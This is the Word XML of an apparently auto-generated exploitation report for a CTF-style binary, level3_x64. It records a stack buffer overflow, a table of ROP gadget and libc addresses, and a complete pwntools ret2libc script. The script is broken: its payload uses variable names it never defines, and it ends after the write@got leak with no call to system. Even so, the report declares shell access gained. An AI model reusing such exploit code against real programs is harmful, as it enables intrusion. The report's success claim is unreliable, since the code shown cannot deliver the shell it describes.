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PWN Exploitation Report</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Basic Information</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Target Binary: </w:t>
      </w:r>
      <w:r>
        <w:t>level3_x64</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Exploitation Time: </w:t>
      </w:r>
      <w:r>
        <w:t>2025-10-23 18:29:42</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Architecture: </w:t>
      </w:r>
      <w:r>
        <w:t>x64</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Vulnerability Type: </w:t>
      </w:r>
      <w:r>
        <w:t>Stack Buffer Overflow</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Exploitation Method: </w:t>
      </w:r>
      <w:r>
        <w:t>ret2libc (write) - x64</w:t>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Buffer Overflow Information</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Buffer Overflow Padding: </w:t>
      </w:r>
      <w:r>
        <w:t>136 bytes</w:t>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Key Address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Address Type</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Address Value</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>pop_rdi</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>0x4006b3</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>pop_rsi</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>0x4006b1</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>ret</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>0x400499</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>write_plt</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>0x4004b0</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>write_got</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>0x600a58</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>main</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>0x40061a</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>system</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>0x7f2f9ca44110</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>sh</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>0x7f2f9cb98ea4</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Exploitation Code</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Complete Python Exploitation Code:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:t>#!/usr/bin/env python3</w:t>
        <w:br/>
        <w:t># -*- coding: utf-8 -*-</w:t>
        <w:br/>
        <w:t># PWN Exploitation Script</w:t>
        <w:br/>
        <w:t># Target: level3_x64</w:t>
        <w:br/>
        <w:t># Exploit Type: ret2libc (write) - x64</w:t>
        <w:br/>
        <w:t># Architecture: x64</w:t>
        <w:br/>
        <w:t># Vulnerability: Stack Buffer Overflow</w:t>
        <w:br/>
        <w:br/>
        <w:t>from pwn import *</w:t>
        <w:br/>
        <w:br/>
        <w:t># Target configuration</w:t>
        <w:br/>
        <w:t>target = 'level3_x64'</w:t>
        <w:br/>
        <w:t>context.arch = 'x64'</w:t>
        <w:br/>
        <w:t>context.log_level = 'debug'</w:t>
        <w:br/>
        <w:br/>
        <w:t># Connect to target</w:t>
        <w:br/>
        <w:t>io = process(target)</w:t>
        <w:br/>
        <w:t># For remote: io = remote('host', port)</w:t>
        <w:br/>
        <w:br/>
        <w:t># Key addresses</w:t>
        <w:br/>
        <w:t>pop_rdi = 0x4006b3</w:t>
        <w:br/>
        <w:t>pop_rsi = 0x4006b1</w:t>
        <w:br/>
        <w:t>ret = 0x400499</w:t>
        <w:br/>
        <w:t>write_plt = 0x4004b0</w:t>
        <w:br/>
        <w:t>write_got = 0x600a58</w:t>
        <w:br/>
        <w:t>main = 0x40061a</w:t>
        <w:br/>
        <w:t>system = 0x7f2f9ca44110</w:t>
        <w:br/>
        <w:t>sh = 0x7f2f9cb98ea4</w:t>
        <w:br/>
        <w:br/>
        <w:t># Construct payload for ret2libc write x64</w:t>
        <w:br/>
        <w:t>padding = b'A' * 136</w:t>
        <w:br/>
        <w:t>payload = padding</w:t>
        <w:br/>
        <w:t>payload += p64(pop_rdi_addr)  # pop rdi; ret</w:t>
        <w:br/>
        <w:t>payload += p64(1)             # stdout fd</w:t>
        <w:br/>
        <w:t xml:space="preserve">payload += p64(pop_rsi_addr)  # pop rsi; ret  </w:t>
        <w:br/>
        <w:t>payload += p64(write_got)     # write@got address</w:t>
        <w:br/>
        <w:t>payload += p64(ret_addr)      # ret gadget</w:t>
        <w:br/>
        <w:t>payload += p64(write_plt)     # write@plt</w:t>
        <w:br/>
        <w:t>payload += p64(main_addr)     # return to main for second stage</w:t>
        <w:br/>
        <w:br/>
        <w:t># Send payload</w:t>
        <w:br/>
        <w:t>io.sendline(payload)</w:t>
        <w:br/>
        <w:br/>
        <w:t># Get shell</w:t>
        <w:br/>
        <w:t>io.interactive()</w:t>
        <w:br/>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Payload Length: </w:t>
      </w:r>
      <w:r>
        <w:t>336 characters</w:t>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Exploitation Summary</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Exploitation Status: </w:t>
      </w:r>
      <w:r>
        <w:t>Successful</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Exploitation Method: </w:t>
      </w:r>
      <w:r>
        <w:t>Successfully gained shell access through Stack Buffer Overflow vulnerability using ret2libc (write) - x64 technique.</w:t>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br/>
        <w:t>──────────────────────────────────────────────────</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Report Generation Tool: </w:t>
      </w:r>
      <w:r>
        <w:t>PwnPasi v3.1</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Generation Time: </w:t>
      </w:r>
      <w:r>
        <w:t>2025-10-23 18:29:44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